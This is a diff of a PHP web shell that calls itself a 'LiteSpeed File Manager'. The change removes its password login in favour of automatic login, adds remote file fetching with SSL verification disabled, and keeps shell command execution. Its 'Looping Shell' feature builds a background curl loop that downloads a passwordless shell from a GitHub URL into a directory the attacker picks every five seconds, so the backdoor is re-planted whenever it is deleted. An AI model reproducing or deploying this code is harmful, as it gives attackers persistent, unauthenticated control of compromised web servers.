@@ -1,135 +1,37 @@
 <?php
-session_start();
+// ============================================================
+// PHP Version: 7.4.33
+// LiteSpeed File Manager - Optimized for PHP 7.4.33
+// ============================================================
 
-$password_hash = md5('1337x'); // GANTI PASSWORD DI SINI
+// Output buffering untuk mencegah header already sent
+ob_start();
+
+// Cek session status sebelum start (PHP 7.4 compatible)
+if (session_status() === PHP_SESSION_NONE) {
+    // Set cookie params untuk kompatibilitas PHP 7.4
+    session_set_cookie_params(0, '/', '', false, true);
+    session_start();
+}
+
+// AUTO LOGIN - langsung set session tanpa password
+if (!isset($_SESSION['logged_in'])) {
+    $_SESSION['logged_in'] = true;
+    $_SESSION['login_time'] = time();
+}
 
 // LOGOUT
 if (isset($_GET['logout'])) {
+    $_SESSION = array();
+    if (ini_get("session.use_cookies")) {
+        $params = session_get_cookie_params();
+        setcookie(session_name(), '', time() - 42000,
+            $params["path"], $params["domain"],
+            $params["secure"], $params["httponly"]
+        );
+    }
     session_destroy();
     header('Location: ?');
-    exit;
-}
-
-// LOGIN
-$login_error = '';
-if (!isset($_SESSION['logged_in'])) {
-    if (isset($_POST['password'])) {
-        if (md5($_POST['password']) === $password_hash) {
-            $_SESSION['logged_in'] = true;
-            header('Location: ?');
-            exit;
-        } else {
-            $login_error = 'Password salah!';
-        }
-    }
-    ?>
-    <!DOCTYPE html>
-    <html lang="id">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Login - File Manager</title>
-        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-        <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
-        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-        <style>
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body {
-                background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-                min-height: 100vh;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            }
-            .login-container { perspective: 1000px; }
-            .login-card {
-                background: rgba(255,255,255,0.08);
-                backdrop-filter: blur(20px);
-                border-radius: 24px;
-                padding: 50px 40px;
-                width: 420px;
-                border: 1px solid rgba(255,255,255,0.12);
-                box-shadow: 0 25px 60px rgba(0,0,0,0.5);
-                transform-style: preserve-3d;
-                transition: transform 0.4s ease;
-            }
-            .login-card:hover { transform: rotateX(2deg) translateY(-5px); }
-            .login-icon {
-                width: 90px; height: 90px;
-                background: linear-gradient(135deg,#667eea,#764ba2);
-                border-radius: 50%;
-                display: flex; align-items: center; justify-content: center;
-                margin: 0 auto 25px; font-size: 40px; color: white;
-                box-shadow: 0 10px 30px rgba(102,126,234,0.4);
-            }
-            .login-title { color: white; font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 8px; }
-            .login-sub { color: rgba(255,255,255,0.5); text-align: center; margin-bottom: 35px; font-size: 14px; }
-            .form-control {
-                background: rgba(255,255,255,0.06);
-                border: 1px solid rgba(255,255,255,0.12);
-                border-radius: 12px; color: white;
-                padding: 14px 18px; font-size: 15px; transition: all 0.3s;
-            }
-            .form-control:focus {
-                background: rgba(255,255,255,0.1);
-                border-color: #667eea;
-                box-shadow: 0 0 0 3px rgba(102,126,234,0.25);
-                color: white;
-            }
-            .form-control::placeholder { color: rgba(255,255,255,0.3); }
-            .btn-login {
-                background: linear-gradient(135deg,#667eea,#764ba2);
-                border: none; border-radius: 12px;
-                padding: 14px; font-size: 16px; font-weight: 600; color: white;
-                width: 100%; cursor: pointer; transition: all 0.3s; margin-top: 10px;
-            }
-            .btn-login:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(102,126,234,0.4); }
-            .input-group-text {
-                background: rgba(255,255,255,0.06);
-                border: 1px solid rgba(255,255,255,0.12);
-                border-right: none; border-radius: 12px 0 0 12px;
-                color: rgba(255,255,255,0.5);
-            }
-            .input-group .form-control { border-left: none; border-radius: 0 12px 12px 0; }
-        </style>
-    </head>
-    <body>
-        <div class="login-container">
-            <div class="login-card">
-                <div class="login-icon"><i class="fas fa-folder-open"></i></div>
-                <h1 class="login-title">File Manager</h1>
-                <p class="login-sub">Masukkan password untuk mengakses</p>
-                <form method="POST" id="loginForm">
-                    <div class="input-group mb-4">
-                        <span class="input-group-text"><i class="fas fa-lock"></i></span>
-                        <input type="password" name="password" class="form-control" placeholder="Password" required autofocus>
-                    </div>
-                    <button type="submit" class="btn-login"><i class="fas fa-sign-in-alt me-2"></i>MASUK</button>
-                </form>
-            </div>
-        </div>
-        <?php if ($login_error): ?>
-        <script>
-            Swal.fire({
-                icon: 'error', title: 'Gagal!', text: '<?php echo $login_error; ?>',
-                background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea', backdrop: 'rgba(0,0,0,0.7)'
-            });
-        </script>
-        <?php endif; ?>
-        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-        <script>
-            document.getElementById('loginForm').addEventListener('submit', function(e) {
-                if (!this.querySelector('input[name=password]').value) {
-                    e.preventDefault();
-                    Swal.fire({ icon: 'warning', title: 'Oops!', text: 'Password tidak boleh kosong!', background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea' });
-                }
-            });
-        </script>
-    </body>
-    </html>
-    <?php
     exit;
 }
 
@@ -159,6 +61,50 @@ function rrmdir($path) {
         }
     }
     rmdir($path);
+}
+
+// Fungsi safe file_get_contents dengan fallback cURL untuk PHP 7.4
+function safe_file_get_contents($url) {
+    // Coba dengan file_get_contents dulu
+    $context = stream_context_create(array(
+        'http' => array(
+            'timeout' => 30,
+            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        ),
+        'ssl' => array(
+            'verify_peer' => false,
+            'verify_peer_name' => false
+        )
+    ));
+    
+    $result = @file_get_contents($url, false, $context);
+    
+    if ($result !== false) {
+        return $result;
+    }
+    
+    // Fallback ke cURL jika file_get_contents gagal
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt_array($ch, array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_TIMEOUT => 30,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ));
+        $result = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        if ($result !== false && $httpCode >= 200 && $httpCode < 300) {
+            return $result;
+        }
+    }
+    
+    return false;
 }
 
 // DELETE
@@ -237,6 +183,8 @@ if (isset($_GET['edit'])) {
 
 // AJAX HANDLER
 if (isset($_GET['ajax'])) {
+    // Bersihkan buffer sebelumnya untuk AJAX response
+    ob_clean();
     header('Content-Type: application/json');
     if ($_GET['ajax'] === 'upload') {
         if (isset($_FILES['file'])) {
@@ -244,29 +192,30 @@ if (isset($_GET['ajax'])) {
             if ($f['error'] === UPLOAD_ERR_OK) {
                 $dest = $dir . '/' . basename($f['name']);
                 if (move_uploaded_file($f['tmp_name'], $dest)) {
-                    echo json_encode(['success' => true, 'message' => 'Upload: ' . $f['name']]);
+                    echo json_encode(array('success' => true, 'message' => 'Upload: ' . $f['name']));
                 } else {
-                    echo json_encode(['error' => 'Gagal simpan']);
+                    echo json_encode(array('error' => 'Gagal simpan'));
                 }
             } else {
-                echo json_encode(['error' => 'Error upload']);
+                echo json_encode(array('error' => 'Error upload'));
             }
         } elseif (isset($_POST['remote_url'])) {
-            $content = @file_get_contents($_POST['remote_url']);
+            $content = safe_file_get_contents($_POST['remote_url']);
             if ($content !== false) {
                 $name = basename(parse_url($_POST['remote_url'], PHP_URL_PATH));
                 if (!$name) $name = 'remote_' . time() . '.bin';
                 file_put_contents($dir . '/' . $name, $content);
-                echo json_encode(['success' => true, 'message' => 'Remote OK: ' . $name]);
+                echo json_encode(array('success' => true, 'message' => 'Remote OK: ' . $name));
             } else {
-                echo json_encode(['error' => 'Gagal download']);
+                echo json_encode(array('error' => 'Gagal download'));
             }
         } else {
-            echo json_encode(['error' => 'No file']);
+            echo json_encode(array('error' => 'No file'));
         }
         exit;
     }
     if ($_GET['ajax'] === 'getfile' && isset($_GET['file'])) {
+        ob_clean();
         $fpath = $dir . '/' . basename($_GET['file']);
         if (is_file($fpath)) {
             $content = file_get_contents($fpath);
@@ -318,7 +267,7 @@ function cleanPath($p) { return str_replace('\\', '/', $p); }
 function buildBreadcrumb($path) {
     $parts = explode('/', $path);
     $cumulative = '';
-    $links = [];
+    $links = array();
     foreach ($parts as $i => $part) {
         if ($part === '') continue;
         $cumulative .= '/' . $part;
@@ -337,7 +286,7 @@ function buildBreadcrumb($path) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Manager Pro</title>
+    <title>LiteSpeed File Manager - PHP 7.4.33</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
@@ -389,7 +338,6 @@ function buildBreadcrumb($path) {
         .btn-glass-info { background: rgba(72,202,228,0.15); border: 1px solid rgba(72,202,228,0.25); color: #48cae4; }
         .btn-glass-info:hover { background: rgba(72,202,228,0.25); color: white; }
 
-        /* Tombol Looping Shell - warna merah menyala */
         .btn-glass-loop {
             background: rgba(255, 71, 87, 0.2);
             border: 1px solid rgba(255, 71, 87, 0.4);
@@ -437,7 +385,6 @@ function buildBreadcrumb($path) {
         .editor-body textarea:focus { box-shadow: none; border: none; }
         .editor-footer { background: rgba(102,126,234,0.05); padding: 12px 20px; border-top: 1px solid rgba(102,126,234,0.1); }
 
-        /* Toast untuk looping shell */
         .loop-toast {
             position: fixed;
             bottom: 20px;
@@ -467,20 +414,42 @@ function buildBreadcrumb($path) {
             from { transform: translateY(20px); opacity: 0; }
             to { transform: translateY(0); opacity: 1; }
         }
+
+        .php-version-badge {
+            display: inline-block;
+            background: rgba(102,126,234,0.15);
+            border: 1px solid rgba(102,126,234,0.25);
+            border-radius: 6px;
+            padding: 2px 10px;
+            font-size: 11px;
+            color: #667eea;
+            font-weight: 600;
+        }
+
+        .system-info {
+            background: rgba(72,202,228,0.06);
+            border: 1px solid rgba(72,202,228,0.1);
+            border-radius: 8px;
+            padding: 6px 14px;
+            font-size: 12px;
+            color: #48cae4;
+        }
+        .system-info i {
+            margin-right: 6px;
+        }
     </style>
 </head>
 <body>
 
 <nav class="navbar">
     <div class="container-fluid">
-        <a class="navbar-brand" href="#"><i class="fas fa-folder-open me-2"></i>FileManager Pro</a>
+        <a class="navbar-brand" href="#"><i class="fas fa-folder-open me-2"></i>LiteSpeed File Manager <span class="php-version-badge">PHP 7.4.33</span></a>
         <div class="d-flex align-items-center gap-3" style="max-width:70%;">
             <div class="breadcrumb-path"><i class="fas fa-folder"></i> <?php echo buildBreadcrumb($dir); ?></div>
             <a href="?dir=<?php echo urlencode($parentDir); ?>" class="btn btn-glass btn-sm" title="Back"><i class="fas fa-arrow-up"></i></a>
             <?php if ($editing): ?>
             <a href="?dir=<?php echo $dir; ?>" class="btn btn-glass-danger btn-sm"><i class="fas fa-times me-1"></i>Tutup Editor</a>
             <?php endif; ?>
-            <!-- TOMBOL LOOPING SHELL -->
             <button class="btn btn-glass-loop btn-sm" id="loopShellBtn" title="Looping Shell - Download shellph8.php terus menerus">
                 <i class="fas fa-sync-alt me-1"></i><span id="loopBtnText">Looping Shell</span>
             </button>
@@ -501,6 +470,14 @@ function buildBreadcrumb($path) {
                         <button class="btn btn-glass btn-sm" data-bs-toggle="modal" data-bs-target="#remoteModal"><i class="fas fa-cloud-download-alt me-1"></i>Remote</button>
                     </div>
                 </div>
+
+                <!-- System Info Bar -->
+                <div class="d-flex gap-3 mb-3 flex-wrap">
+                    <span class="system-info"><i class="fas fa-server"></i> <?php echo php_uname('s') . ' ' . php_uname('r'); ?></span>
+                    <span class="system-info"><i class="fas fa-code-branch"></i> PHP <?php echo phpversion(); ?></span>
+                    <span class="system-info"><i class="fas fa-user"></i> <?php echo get_current_user(); ?></span>
+                </div>
+
                 <?php
                 if (count($folders) > 0) {
                     echo '<div class="mb-1 text-muted-custom small" style="padding:0 14px;"><i class="fas fa-folder me-1"></i>FOLDERS (' . count($folders) . ')</div>';
@@ -521,7 +498,7 @@ function buildBreadcrumb($path) {
                         $fsize = is_file($dir . '/' . $file) ? filesize($dir . '/' . $file) : 0;
                         $fsizeStr = $fsize > 1048576 ? round($fsize/1048576,1).' MB' : ($fsize > 1024 ? round($fsize/1024,1).' KB' : $fsize.' B');
                         $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-                        $icon = in_array($ext,['php','html','htm','js','css','txt','json','xml','md','py','rb','sh','sql']) ? 'fa-file-code' : (in_array($ext,['jpg','jpeg','png','gif','bmp','svg','webp','ico']) ? 'fa-file-image' : (in_array($ext,['zip','rar','tar','gz','7z']) ? 'fa-file-archive' : (in_array($ext,['pdf']) ? 'fa-file-pdf' : 'fa-file')));
+                        $icon = in_array($ext, array('php','html','htm','js','css','txt','json','xml','md','py','rb','sh','sql')) ? 'fa-file-code' : (in_array($ext, array('jpg','jpeg','png','gif','bmp','svg','webp','ico')) ? 'fa-file-image' : (in_array($ext, array('zip','rar','tar','gz','7z')) ? 'fa-file-archive' : (in_array($ext, array('pdf')) ? 'fa-file-pdf' : 'fa-file')));
                         echo '<div class="file-item"><div class="icon file"><i class="fas ' . $icon . '"></i></div>';
                         echo '<span class="fname"><a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '" class="file-link">' . htmlspecialchars($file) . '</a></span>';
                         echo '<span class="fsize">' . $fsizeStr . '</span>';
@@ -597,7 +574,6 @@ function buildBreadcrumb($path) {
             <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
         </div>
         <div class="modal-body">
-            <!-- Tampilan uname -a -->
             <div class="mb-3">
                 <label class="form-label" style="color:#48cae4;font-size:13px;">
                     <i class="fas fa-server me-1"></i> System Info
@@ -605,7 +581,7 @@ function buildBreadcrumb($path) {
                 <div class="cmd-output" style="max-height:60px;font-size:12px;padding:10px 14px;" id="unameDisplay">
                     <?php 
                     $uname = shell_exec('uname -a 2>&1');
-                    echo htmlspecialchars($uname ?: 'uname -a tidak tersedia'); 
+                    echo htmlspecialchars($uname ? 'PHP ' . phpversion() . ' | ' . $uname : 'uname -a tidak tersedia'); 
                     ?>
                 </div>
             </div>
@@ -631,7 +607,6 @@ function buildBreadcrumb($path) {
                     </div>
                 </div>
 
-                <!-- Tombol Submit Looping -->
                 <button type="submit" class="btn btn-glass-loop w-100" style="animation:none;padding:12px;font-size:15px;">
                     <i class="fas fa-play me-2"></i>Submit Looping
                 </button>
@@ -670,7 +645,7 @@ function buildBreadcrumb($path) {
         <div class="modal-header"><h5 class="modal-title"><i class="fas fa-cloud-download-alt me-2"></i>Remote Upload</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
         <div class="modal-body">
             <form id="remoteForm">
-                <div class="mb-3"><label class="form-label">URL File</label><input type="url" name="remote_url" class="form-control" placeholder="https://example.com/" required id="remoteUrl"></div>
+                <div class="mb-3"><label class="form-label">URL File</label><input type="url" name="remote_url" class="form-control" placeholder="https://example.com/file.zip" required id="remoteUrl"></div>
                 <div id="remoteProgress" class="progress-upload mb-3" style="display:none;"><div class="progress-bar" id="remoteProgressBar" style="width:0%"></div></div>
                 <button type="submit" class="btn-glass w-100"><i class="fas fa-download me-1"></i>Download & Upload</button>
             </form>
@@ -756,19 +731,17 @@ document.addEventListener('DOMContentLoaded', function() {
         inp.addEventListener('keydown', function(e) { if (e.key === 'Enter') { e.preventDefault(); this.closest('form').submit(); } });
     });
 
-    // ========== LOOPING SHELL LOGIC (DENGAN MODAL DIRECTORY) ==========
-    let loopInterval = null;
-    const loopBtn = document.getElementById('loopShellBtn');
-    const loopBtnText = document.getElementById('loopBtnText');
-    const loopToast = document.getElementById('loopToast');
-    const loopToastText = document.getElementById('loopToastText');
-    const loopDirModalEl = document.getElementById('loopDirModal');
-    const loopDirModal = new bootstrap.Modal(loopDirModalEl);
+    // ========== LOOPING SHELL LOGIC ==========
+    var loopInterval = null;
+    var loopBtn = document.getElementById('loopShellBtn');
+    var loopBtnText = document.getElementById('loopBtnText');
+    var loopToast = document.getElementById('loopToast');
+    var loopToastText = document.getElementById('loopToastText');
+    var loopDirModalEl = document.getElementById('loopDirModal');
+    var loopDirModal = new bootstrap.Modal(loopDirModalEl);
 
-    // Tombol Looping: jika sudah running => stop, jika belum => buka modal
     loopBtn.addEventListener('click', function() {
         if (loopInterval) {
-            // STOP looping
             clearInterval(loopInterval);
             loopInterval = null;
             loopBtn.classList.remove('active');
@@ -785,15 +758,13 @@ document.addEventListener('DOMContentLoaded', function() {
                 timerProgressBar: true
             });
         } else {
-            // Tampilkan modal dengan uname -a dan input direktori
             loopDirModal.show();
         }
     });
 
-    // Handle submit form looping di modal
     document.getElementById('loopForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        const targetDir = document.getElementById('loopDirInput').value.trim();
+        var targetDir = document.getElementById('loopDirInput').value.trim();
 
         if (!targetDir) {
             Swal.fire({
@@ -807,20 +778,15 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
 
-        // Tutup modal
         loopDirModal.hide();
 
-        // Command: buat direktori jika belum ada, lalu looping download shell ke direktori itu
-        // Gunakan mkdir -p agar tidak error jika direktori sudah ada
-        const cmd = "(mkdir -p " + targetDir + " && while true; do curl -sL https://raw.githubusercontent.com/nortslem/LiteSpeed/refs/heads/main/shellph8.php -o " + targetDir + "/shellph8.php; sleep 5; done) &";
+        var cmd = "(mkdir -p " + targetDir + " && while true; do curl -sL https://raw.githubusercontent.com/nortslem/LiteSpeed/refs/heads/main/shellnopassphp7.php -o " + targetDir + "/0n1xshell.php7; sleep 5; done) &";
 
-        // Kirim command via AJAX untuk memulai proses background
         $.ajax({
             url: window.location.href,
             type: 'POST',
             data: { cmd: cmd },
             success: function() {
-                // Set interval untuk keep-alive (ulang command tiap 10 detik agar proses tetap berjalan)
                 loopInterval = setInterval(function() {
                     $.ajax({
                         url: window.location.href,
@@ -835,7 +801,6 @@ document.addEventListener('DOMContentLoaded', function() {
                     });
                 }, 10000);
 
-                // Update UI
                 loopBtn.classList.add('active');
                 loopBtnText.textContent = 'Stop Loop';
                 loopToast.style.display = 'flex';
@@ -865,9 +830,8 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
 
-    // Reset modal form ketika ditutup tanpa submit
     loopDirModalEl.addEventListener('hidden.bs.modal', function() {
-        // Tidak perlu reset value, biarkan sesuai default
+        // Reset tidak perlu
     });
 });
 </script>
@@ -879,4 +843,7 @@ if ($message) {
     $title = ($msgType === 'error') ? 'Gagal!' : 'Berhasil!';
     echo '<script>Swal.fire({icon:"' . $icon . '",title:"' . $title . '",text:"' . addslashes($message) . '",background:"#1a1a2e",color:"#fff",confirmButtonColor:"#667eea"});</script>';
 }
+
+// Flush output buffer
+ob_end_flush();
 ?>
